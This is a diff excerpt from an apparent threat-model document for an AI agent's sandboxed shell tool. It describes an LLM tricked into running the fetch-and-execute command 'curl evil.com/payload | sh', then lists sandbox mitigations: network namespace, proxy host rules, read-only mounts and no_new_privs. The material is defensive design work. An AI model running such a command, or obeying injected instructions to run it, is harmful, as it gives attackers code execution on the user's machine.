@@ -383,7 +383,7 @@ When stdin is not a tty (`-p` piped mode) nobody can be asked, and nothing runs 
 LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.
 
 Mitigations:
-- The shell child runs in a network namespace. The only route out is the proxy, reached through the proxy variables; a program that ignores them has no network.
+- The shell child runs in a network namespace. The only route out is the proxy, reached through the proxy variables; a program that ignores them has no network, or on a host with connect() interception has its `connect()` tunnelled through the proxy ([containment.md](containment.md#connect-interception)).
 - The proxy checks `evil.com` against the call's host rules → denied (403).
 - System directories are mounted read-only. A written file lands only in the workspace, `/tmp` scratch, or a `write_path` grant; `/dev/shm`, `/dev/mqueue` and `/dev/pts` are private per call, never the host's.
 - `no_new_privs` is set on every sandboxed tool child: a setuid binary does not elevate.
